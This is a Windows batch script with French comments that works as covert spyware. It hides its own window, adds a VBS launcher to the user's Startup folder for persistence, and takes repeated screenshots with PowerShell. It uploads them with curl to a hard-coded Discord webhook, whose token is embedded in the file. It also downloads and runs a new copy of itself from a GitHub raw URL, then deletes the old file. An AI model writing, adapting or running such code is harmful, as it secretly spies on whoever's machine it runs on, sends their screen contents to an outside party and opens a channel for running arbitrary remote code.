::8
@echo off
if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
setlocal enabledelayedexpansion
::salute num 888


set debutchemin=%~dp0

:: 📌 Définition des variables
set WEBHOOK_URL=https://discord.com/api/webhooks/1334179975577862215/FQLGLyudyE8QhYH4OS9MoH-5970K2FU1Ug3tCZ0x7KdWJHHjVMXnSjzSsrOdL8yIGfEo
set SCREENSHOT_PATH=%debutchemin%\screenshot.png

set END_TIME=%TIME:~0,2%
set /A END_TIME+=0
set /A END_TIME+=1
set USER=Auren009
set REPO=lunettes-octo-flottantes

:: Définir le chemin vers le future fichier batch et vbs
set chemin=%debutchemin%paserelle.bat
set chemin_vbs=%debutchemin%lancer_cacheeeeee.vbs
set URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat
set DESTINATION=WebHook.bat




set version=8

:recommencer

set photo=true
    set NbPhoto=2
    set TempsEntre=10
::

set message=false
    set MESSAGE1=Bonjour
::


:: Lancer au demarage
    :: Copier le fichier VBS dans le dossier de démarrage
    echo Set WshShell = CreateObject("WScript.Shell") > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\lancerWebHook2.vbs"
    echo WshShell.Run """%debutchemin%WebHook.bat""", 0, False >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\lancerWebHook2.vbs"


    :: Vérifier si l'opération a réussi
    if %ERRORLEVEL%==0 (
        echo Le fichier lancerWebHook.vbs a ete ajoute au demarrage.
    ) else (
        echo Une erreur est survenue lors de l'ajout du fichier au demarrage.
    )
::


if %message%==true (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%MESSAGE1%\"}" %WEBHOOK_URL%
)




if %photo%==true (
    :: Si "photo" est égal à 1, prend une capture d'écran et l'envoie
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Lancement_des_capture\"}" %WEBHOOK_URL%

    :: 📸 Fonction pour prendre une capture d'écran
    :TAKE_SCREENSHOT
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('%SCREENSHOT_PATH%', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose();"

    :: 🖼 Vérifier que la capture a bien été prise
    if not exist "%SCREENSHOT_PATH%" (
        echo ❌ Erreur : Capture d'écran non trouvée !
        pause
        exit /b
    )

    :: 🚀 Envoyer la capture à Discord
    curl -F "file=@%SCREENSHOT_PATH%" %WEBHOOK_URL%

    :: 🎯 Vérification du temps d'envoi (toutes les 10 secondes pendant 30 secondes)
    set /A COUNT+=1
    if !COUNT! geq %NbPhoto% (
        del "%SCREENSHOT_PATH%"
        curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Fin_des_capture\"}" %WEBHOOK_URL% 
        goto END
    )

    :: Pause de 10 secondes avant la prochaine capture
    timeout /t %TempsEntre% >nul
    goto TAKE_SCREENSHOT


)


:END

::Regarder la nouvelle version

    :: URL du fichier sur GitHub avec ajout d'un paramètre pour forcer la mise à jour
    set "github_url=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat"
    echo verification de la nouvelle version

    rem Télécharger le fichier
    curl -s "%github_url%" > temp.txt

    rem Extraire la première ligne et enlever les "::"
    for /f "tokens=*" %%A in (temp.txt) do (
        set "first_line=%%A"
        rem Supprimer "::" au début de la ligne
        set "first_line=!first_line::=!"
        goto :got_first_line
    )
    :got_first_line


    rem Nettoyer le fichier temporaire
    del temp.txt


    set nouversion=%frist_line%
     La version recente est : %nouversion%





::



:: Vérifier si c'est la derniere version
    echo Compareson version %nouversion% et %version%, actuel.
    if %nouversion% neq %version% (
        curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Il existe une nouvelle version\"}" %WEBHOOK_URL%
        goto :debutversion
    )
    if %nouversion% == %version% (
        curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"C'est la derniere version\"}" %WEBHOOK_URL%
    )
::

goto :finversion

:debutversion

::Changer la version
    :: Crée un nouveau fichier batch, paserelle, avec le chemin défini (Doit téléharger nouv version, puis la lancer et se suppr) Tout fait
    echo mise a jour de la version
    echo @echo off > "%chemin%"
    echo setlocal enabledelayedexpansion >> "%chemin%"
    echo set "URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat" >> "%chemin%"
    echo set "DESTINATION=%debutchemin%WebHook.bat" >> "%chemin%"
    echo curl -o "%DESTINATION%" "%URL%" > nul 2>&1 >> "%chemin%"
    echo cscript //nologo "%debutchemin%lancerWebHook.vbs" >> "%chemin%"
    echo del "%chemin_vbs%" >> "%chemin%"
    echo del "%chemin%" >> "%chemin%"

    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Mise a jour\"}" %WEBHOOK_URL%

    ::Crée le fichier vbs
    echo Set WshShell = CreateObject("WScript.Shell") > "%chemin_vbs%"
    echo WshShell.Run "cmd /c ""%chemin%""", 0, False >> "%chemin_vbs%"



    ::Lance le vbs
    cscript //nologo "%chemin_vbs%"

    del "%chemin_vbs%"

    :: Supprime le programme batch principal (se suppr)
    del "%~f0"
::

:finversion

goto :recommencer


